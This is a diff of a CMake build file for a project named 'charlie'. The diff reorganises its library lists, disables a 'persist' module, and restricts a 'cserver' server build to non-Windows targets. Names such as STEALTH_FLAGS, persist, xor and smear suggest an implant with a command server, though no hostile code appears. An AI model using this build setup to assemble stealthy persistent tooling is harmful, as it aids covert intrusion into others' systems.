@@ -38,6 +38,7 @@ include_directories(${CPPNETLIB_INCLUDE_DIRS})
 MESSAGE( STATUS "GModule: ${GLIB_GMODULE_LIBRARIES}")
 MESSAGE( STATUS "GLIB: ${GLIB_LIBRARIES}")
 set(LIBS -Wl,-Bstatic ${OPENSSL_LIBRARIES} ${PROTOBUF_LITE_LIBRARIES} ${Boost_SYSTEM_LIBRARY} ${Boost_CHRONO_LIBRARY} ${Boost_FILESYSTEM_LIBRARY} ${Boost_THREAD_LIBRARY} ${GLIB_GMODULE_LIBRARIES} ${GLIB_LIBRARIES} -Wl,-Bdynamic ${CMAKE_THREAD_LIBS_INIT} ${DL_LIBRARIES})
+set(MANAGER_LIBS -Wl,-Bstatic ${CPPNETLIB_LIBRARIES} ${OPENSSL_LIBRARIES} ${PROTOBUF_LITE_LIBRARIES} ${Boost_SYSTEM_LIBRARY} ${Boost_CHRONO_LIBRARY} ${Boost_FILESYSTEM_LIBRARY} ${Boost_THREAD_LIBRARY} ${Boost_REGEX_LIBRARY} -Wl,-Bdynamic ${CMAKE_THREAD_LIBS_INIT} ${DL_LIBRARIES})
 
 if(WINCC)
   find_package(ZLIB REQUIRED)
@@ -51,12 +52,10 @@ if(WINCC)
     /usr/lib
     /usr/local/lib)
   find_package(Intl REQUIRED)
-  list(APPEND LIBS -Wl,-Bstatic ${ZLIB_LIBRARIES} ${Intl_LIBRARIES} winmm ${IPHLPAP_LIBRARY})
-endif()
 
-if(WINCC)
-  add_definitions("-DPTW32_STATIC_LIB")
-  LIST(APPEND LIBS ${WINSOCK_LIBRARY} ${LIBICONV_LIBRARY} ${Intl_LIBRARIES})
+  add_definitions("-DPTW32_STATIC_LIB -DWIN32_LEAN_AND_MEAN")
+  list(APPEND LIBS -Wl,-Bstatic ${WINSOCK_LIBRARY} ${ZLIB_LIBRARIES} ${Intl_LIBRARIES} winmm ${IPHLPAP_LIBRARY} ${LIBICONV_LIBRARY})
+  list(APPEND MANAGER_LIBS -Wl,-Bstatic ${WINSOCK_LIBRARY} ${Intl_LIBRARIES} winmm ${IPHLPAP_LIBRARY} ${LIBICONV_LIBRARY} ${ZLIB_LIBRARIES})
 endif()
 
 set(STEALTH_FLAGS "-std=c++11 -fno-rtti -DBOOST_NO_RTTI -DGOOGLE_PROTOBUF_NO_RTTI -D_WIN32_WINNT=0x0501 -fvisibility=hidden")
@@ -106,14 +105,14 @@ add_library(manager SHARED ${manager_SRC} "src/charlie/base64.cpp" "charlie.pb.r
 set_target_properties(manager PROPERTIES COMPILE_FLAGS "${MODULE_FLAGS}")
 set_target_properties(manager PROPERTIES LINK_FLAGS     ${STATIC_LIBC_ARGS})
 set_target_properties(manager PROPERTIES LINK_SEARCH_END_STATIC ON)
-target_link_libraries(manager -Wl,-Bstatic ${CPPNETLIB_LIBRARIES} ${Boost_THREAD_LIBRARY} ${Boost_REGEX_LIBRARY} ${PROTOBUF_LITE_LIBRARIES} ${OPENSSL_LIBRARIES})
+target_link_libraries(manager ${MANAGER_LIBS})
 
 # Build persist
-file(GLOB persist_SRC "src/modules/persist/*.cpp")
-add_library(persist SHARED ${persist_SRC} "charlie.pb.redacted.cc")
-set_target_properties(persist PROPERTIES COMPILE_FLAGS "${MODULE_FLAGS}")
-set_target_properties(persist PROPERTIES LINK_FLAGS     ${STATIC_LIBC_ARGS})
-target_link_libraries(persist -Wl,-Bstatic  ${Boost_SYSTEM_LIBRARY} ${Boost_FILESYSTEM_LIBRARY} ${PROTOBUF_LITE_LIBRARIES})
+#file(GLOB persist_SRC "src/modules/persist/*.cpp")
+#add_library(persist SHARED ${persist_SRC} "charlie.pb.redacted.cc")
+#set_target_properties(persist PROPERTIES COMPILE_FLAGS "${MODULE_FLAGS}")
+#set_target_properties(persist PROPERTIES LINK_FLAGS     ${STATIC_LIBC_ARGS})
+#target_link_libraries(persist -Wl,-Bstatic  ${Boost_SYSTEM_LIBRARY} ${Boost_FILESYSTEM_LIBRARY} ${PROTOBUF_LITE_LIBRARIES})
 
 # Set the list of libraries to compile embed code
 set(embed_libraries manager)
@@ -191,18 +190,20 @@ set_target_properties(charlie PROPERTIES LINK_FLAGS     ${STATIC_LIBC_ARGS})
 target_link_libraries(charlie ${LIBS})
 
 # Now let's compile the server
-set(SERVER_LIBS -Wl,-Bstatic ${CPPNETLIB_LIBRARIES} ${OPENSSL_LIBRARIES} ${PROTOBUF_LIBRARIES} ${Boost_SYSTEM_LIBRARY} -Wl,-Bdynamic ${CMAKE_THREAD_LIBS_INIT} ${DL_LIBRARIES})
+if(NOT WINCC)
+  set(SERVER_LIBS -Wl,-Bstatic ${CPPNETLIB_LIBRARIES} ${OPENSSL_LIBRARIES} ${PROTOBUF_LIBRARIES} ${Boost_SYSTEM_LIBRARY} -Wl,-Bdynamic ${CMAKE_THREAD_LIBS_INIT} ${DL_LIBRARIES})
 
-file(GLOB cserver_SRC "src/cserver/*.cpp")
-file(GLOB protogen_SRC "src/protogen/*.cc")
-file(GLOB http_SRC "src/http/*.cpp")
-add_executable(cserver ${cserver_SRC} ${protogen_SRC} ${http_SRC}
-  "src/charlie/Crypto.cpp"
-  "src/charlie/base64.cpp"
-  "src/charlie/hash.cpp"
-  "src/charlie/xor.cpp"
-  "src/charlie/smear.cpp"
-  )
-target_link_libraries(cserver ${SERVER_LIBS})
-set_target_properties(cserver PROPERTIES COMPILE_FLAGS "${STEALTH_FLAGS}")
-set_target_properties(cserver PROPERTIES LINK_FLAGS     ${STATIC_LIBC_ARGS})
+  file(GLOB cserver_SRC "src/cserver/*.cpp")
+  file(GLOB protogen_SRC "src/protogen/*.cc")
+  file(GLOB http_SRC "src/http/*.cpp")
+  add_executable(cserver ${cserver_SRC} ${protogen_SRC} ${http_SRC}
+    "src/charlie/Crypto.cpp"
+    "src/charlie/base64.cpp"
+    "src/charlie/hash.cpp"
+    "src/charlie/xor.cpp"
+    "src/charlie/smear.cpp"
+    )
+  target_link_libraries(cserver ${SERVER_LIBS})
+  set_target_properties(cserver PROPERTIES COMPILE_FLAGS "${STEALTH_FLAGS}")
+  set_target_properties(cserver PROPERTIES LINK_FLAGS     ${STATIC_LIBC_ARGS})
+ endif()
